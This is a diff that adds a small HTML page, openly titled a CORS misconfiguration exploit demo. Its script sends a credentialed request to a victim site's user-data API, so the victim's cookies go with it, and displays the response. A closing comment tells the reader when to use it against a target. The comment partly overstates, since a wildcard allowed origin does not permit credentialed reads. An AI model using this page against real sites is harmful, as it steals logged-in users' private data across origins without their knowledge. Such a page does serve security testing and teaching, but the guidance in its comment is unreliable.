@@ -1,0 +1,24 @@
+<!-- cors-misconfig.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Misconfig Exploit</title>
+</head>
+<body>
+  <h2>CORS Exploit Demo</h2>
+  <button onclick="stealData()">Steal Cross-Origin Data</button>
+  <pre id="result"></pre>
+
+  <script>
+    async function stealData() {
+      const response = await fetch("http://victim.local/api/user-data", {
+        credentials: 'include'  // sends victim cookies
+      });
+      const data = await response.text();
+      document.getElementById("result").innerText = data;
+    }
+  </script>
+</body>
+</html>
+
+<!-- Use this when the target site has Access-Control-Allow-Origin: * or reflects Origin -->
